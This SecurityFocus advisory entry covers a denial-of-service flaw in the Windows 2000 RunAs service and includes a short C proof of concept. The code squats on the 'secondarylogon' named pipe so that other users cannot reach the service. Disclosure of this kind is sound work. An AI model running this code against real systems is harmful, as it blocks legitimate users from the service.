source: http://www.securityfocus.com/bid/3291/info

The Windows 2000 RunAs service allows an application or service to be executed as a different user. It is accessed by holding down the shift key and right mouse clicking on an icon, then selecting 'Run as...' from the context menu.

When the service is invoked, it creates a named pipe session with the specified server for authentication of credentials. The RunAs service only allows one instance of this session at a time. If a client were to create this pipe on the server without requesting any service, other clients would be unable to connect to this service. 

// radix1112200103.c - Camisade - Team RADIX - 11-12-2001
//
// Camisade (www.camisade.com) is not responsible for the use or
// misuse of this proof of concept source code.

#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE

#include <windows.h>
#include <tchar.h>

#include <stdio.h>
#include <conio.h>

#define SECLOGON_PIPE   _T("\\\\.\\pipe\\secondarylogon")


void main()
{
   HANDLE hPipe;

   hPipe = CreateFile(SECLOGON_PIPE, GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
   if (hPipe == INVALID_HANDLE_VALUE)
   {
      printf("Unable to open pipe, error %d\n", GetLastError());
      return;
   }

   printf("Connected to pipe.  Press any key to disconnect.\n");
   getche();

   CloseHandle(hPipe);
}